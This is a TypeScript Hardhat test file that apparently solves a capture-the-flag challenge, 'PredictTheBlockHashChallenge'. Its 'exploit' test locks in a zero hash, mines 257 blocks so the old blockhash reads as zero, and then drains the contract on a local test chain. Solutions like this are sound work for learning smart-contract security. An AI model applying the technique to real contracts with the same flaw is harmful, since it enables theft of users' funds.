import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */
    // Predicting the blockhash is impossible BUT here is the trick:
    // Ethereum only stores the last 256 blockhashes
    // For earlier blocks, it gives an empty blockhash of 0x0
    // So we need to wait for 256 mined blocks!

    // Pass the value of 0x0 in function lockInGuess()
    const tx1 = await target.lockInGuess(ethers.constants.HashZero, {
      value: ethers.utils.parseEther('1'),
    });
    await tx1.wait();

    // Mine 256 blocks to ensure the blockhash becomes inaccessible
    for (let i = 0; i < 257; i++) {
      await ethers.provider.send('evm_mine', []);
    }

    // Now, call the settle function to complete the challenge
    const tx2 = await target.settle();
    await tx2.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
